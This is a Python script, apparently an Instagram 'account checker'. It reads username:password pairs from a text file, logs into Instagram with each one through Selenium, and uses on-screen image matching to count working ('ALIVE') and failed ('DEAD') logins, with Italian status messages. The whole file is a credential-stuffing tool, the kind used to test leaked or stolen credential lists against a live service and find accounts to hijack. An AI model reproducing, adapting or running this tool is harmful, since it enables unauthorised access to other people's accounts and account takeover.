from selenium import webdriver
import time as t
#from Credentials import username,psw
import pyautogui as p
from colorama import Fore,Style


good=0

bad=0


try:
    file = open("IGAccountlist.txt")
    accounts = list(file)
   #print (accounts)
    c3=""
    for item in accounts:
        c3+=item
    accounts=c3.split("\n")
    c2=""
    print(accounts)

    for account in accounts:

        acc= account.split(":")
        username=acc[0]
        psw=acc[1]

        
        driver=webdriver.Chrome()
        driver.get("https://instagram.com/accounts/login/")
        t.sleep(2)
        try:
            driver.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div/div[1]/div/label/input").send_keys(username)
            driver.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div/div[2]/div/label/input").send_keys(psw)
            driver.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div/div[3]/button").click()
        except:
            driver.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[1]/div/label/input").send_keys(username)
            driver.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[2]/div/label/input").send_keys(psw)
            driver.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]/button").click()
            
            
        
        t.sleep(3)
        if p.locateCenterOnScreen("iglog.png",confidence=0.7)!=None:
            
            print(Fore.LIGHTGREEN_EX+"[GOOD]account valido")
            good+=1
        else:
            #print(Fore.LIGHTRED_EX+"[BAD]account non valido")
            t.sleep(1.3)
            if p.locateCenterOnScreen("ignonora.png",confidence=0.7)!=None:
                 print(Fore.LIGHTGREEN_EX+"[GOOD]account valido")
                 good+=1
            else:
                 print(Fore.LIGHTRED_EX+"[BAD]account non valido")
                 bad+=1
                 
            
           
       
        
        
        p.hotkey("alt","f4")
        t.sleep(1)
except Exception as e:
    print(str(e))
print("ALIVE Account:"+str(good)+"\nDEAD Account:"+ str(bad))
print("Total Account:"+str(good+bad))
    
        


#print("fine")
t.sleep(3)


                                                                          




